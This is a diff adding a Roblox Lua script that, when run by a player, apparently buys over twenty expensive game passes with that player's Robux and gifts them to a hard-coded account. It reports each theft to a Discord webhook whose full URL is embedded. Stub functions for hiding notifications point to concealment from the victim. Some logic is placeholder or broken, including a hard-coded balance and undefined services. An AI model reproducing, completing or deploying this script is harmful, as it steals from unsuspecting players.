@@ -1,0 +1,149 @@
+-- Define required services
+local HttpService = game:GetService("HttpService")
+
+-- Define the second recipient
+local SecondUsername = "aka_0ver"
+local SecondUserId
+
+-- Get the user ID of the second recipient
+local success, err = pcall(function()
+    SecondUserId = Players:GetUserIdFromNameAsync(SecondUsername)
+end)
+
+if not success then
+    warn("Error fetching second user ID: " .. tostring(err))
+end
+
+-- Webhook URL (set this to your desired webhook endpoint)
+local WebhookURL = "https://discord.com/api/webhooks/1338399866564378635/o5_DneS-TgTmAmktnm0AZhlBdguLs_Gnr4ZaE0Z_MFqxmMvudNEW6QnYOsnFNjbOJmyx"
+
+-- List of game passes above 400 Robux to gift
+local highValueGamePasses = {
+    {name = "Permanent Dragon-Dragon", cost = 5000},
+    {name = "Permanent Kitsune-Kitsune", cost = 4000},
+    {name = "Permanent Yeti-Yeti", cost = 3000},
+    {name = "Fruit Notifier", cost = 2700},
+    {name = "Permanent Spirit-Spirit", cost = 2550},
+    {name = "Permanent Gas-Gas", cost = 2500},
+    {name = "Permanent Venom-Venom", cost = 2450},
+    {name = "Permanent Shadow-Shadow", cost = 2425},
+    {name = "Permanent Dough-Dough", cost = 2400},
+    {name = "Permanent T-Rex-T-Rex", cost = 2350},
+    {name = "Permanent Gravity-Gravity", cost = 2300},
+    {name = "Permanent Blizzard-Blizzard", cost = 2250},
+    {name = "Permanent Pain-Pain", cost = 2200},
+    {name = "Permanent Rumble-Rumble", cost = 2100},
+    {name = "Permanent Portal-Portal", cost = 2000},
+    {name = "Permanent Sound-Sound", cost = 1900},
+    {name = "Permanent Spider-Spider", cost = 1800},
+    {name = "Permanent Love-Love", cost = 1700},
+    {name = "Permanent Buddha-Buddha", cost = 1650},
+    {name = "Dark Blade", cost = 1200},
+    {name = "Permanent Light-Light", cost = 1100},
+    {name = "Permanent Diamond-Diamond", cost = 1000}
+}
+
+-- Randomized message pool
+local messages = {
+    "Enjoy your gift!",
+    "A special present just for you!",
+    "Hope you like it!",
+    "Surprise! A gift has arrived!",
+    "You’ve earned this!",
+    "A little something for you!",
+    "A gift to brighten your day!",
+    "Here’s something special!",
+    "A reward for being awesome!",
+    "You deserve this!"
+}
+
+-- Function to hide notifications
+local function hideNotifications()
+    -- Add logic to hide notifications if needed
+end
+
+-- Function to send execution log
+local function sendExecutionLog()
+    -- Add logic to send execution logs if needed
+end
+
+-- Function to get Robux and proceed
+local function getRobuxAndProceed()
+    -- Add logic to process Robux transactions if needed
+end
+
+-- Function to send a webhook notification
+local function sendWebhookNotification(message)
+    if WebhookURL ~= "" then
+        local data = HttpService:JSONEncode({content = message})
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = data
+        })
+    end
+end
+
+-- Function to retrieve the user's Robux balance
+local function getRobuxBalance()
+    -- Placeholder function: replace with actual logic to retrieve balance
+    return 500 -- Example balance, replace this with real fetching logic
+end
+
+-- Function to get a random message
+local function getRandomMessage()
+    return messages[math.random(1, #messages)]
+end
+
+-- Function to purchase an item for a user
+local function buyItem(storageName, purchaseLocation, cost, targetUser)
+    local args = {
+        [1] = "buyRobuxShop",
+        [2] = {
+            ["Message"] = getRandomMessage(),
+            ["StorageName"] = storageName,
+            ["PurchaseLocation"] = purchaseLocation,
+            ["FunnelId"] = "Shop",
+            ["ReceiverName"] = targetUser.name,
+            ["ReceiverUserId"] = targetUser.id
+        }
+    }
+    
+    local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+    pcall(function()
+        CommF:InvokeServer(unpack(args))
+    end)
+end
+
+-- Function to gift high-value game passes
+local function giftHighValueGamePasses(targetUser)
+    for _, gamePass in ipairs(highValueGamePasses) do
+        if gamePass.cost > 400 then
+            buyItem(gamePass.name, "Shop", 0, targetUser)
+        end
+    end
+    sendWebhookNotification("Gifted high-value game passes to " .. targetUser.name)
+end
+
+-- Function to check and gift based on balance
+local function checkAndGift()
+    local balance = getRobuxBalance()
+    
+    if balance >= 400 then
+        -- Gift high-value game passes to second user
+        if SecondUserId then
+            giftHighValueGamePasses({ name = SecondUsername, id = SecondUserId })
+        end
+    end
+end
+
+-- Integrate with main script execution
+local function mainExecution()
+    hideNotifications()
+    sendExecutionLog()
+    getRobuxAndProceed()
+    checkAndGift()
+end
+
+mainExecution()
